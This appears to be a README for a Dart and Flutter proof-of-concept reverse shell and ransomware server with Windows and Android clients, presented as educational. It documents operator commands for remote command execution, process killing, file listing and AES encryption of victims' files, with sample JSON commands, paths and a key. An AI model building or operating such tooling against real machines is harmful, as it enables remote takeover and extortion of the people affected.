# security-server-project
This project demonstrates a proof-of-concept implementation of a Reverse Shell and Ransomware Server and Clients using Dart. The purpose of this project is educational, showcasing how reverse shells and ransomware work in a controlled environment. It is not intended for malicious use.

# Features
- Reverse Shell: Allows the server to execute commands on the client machine.
- Ransomware: Encrypts/Decrypts files on the client machine once connected to the server using Advanced Encryption Standard (AES).
- Multi-Platform: Windows version and Android version developed with Flutter.

#### This project was inspired by "Joao-b4".

# Usage 

        Run the server: In the terminal/cmd, go to server/bin folder, and run the command "dart run main.dart"
        
        Options:
        /list - List all of the Clients connected
        /set id - Enter the command interface for the selected client
        /exit - Exit to command interface

        Commands Avaible:
        * Get Information from System:  {"id": "1"} 
        * Run Command on System:  {"id": "2", "parameter": "ipconfig"}
        * Run Command on System through powershell *(Windows only): {"id": "3", "parameter": "ls"}
        * Kill Process in the System: {"id": "4", "parameter": "4517"} 
        * List phone files: {"id":"5"}
        * Encrypt files from selected path to .mart: 
          ** Desktop: {"id": "6", "path":"C:\Users\docteur\Desktop\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"} 
          ** Phone: {"id": "6", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}     

        * Decrypt files(.MART) from selected path: 
          we are using AES, hence the need of the key in the decryption.
          ** Desktop: {"id": "7", "path":"C:\Users\docteur\Desktop\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO" } 
          ** Phone: {"id": "7", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}
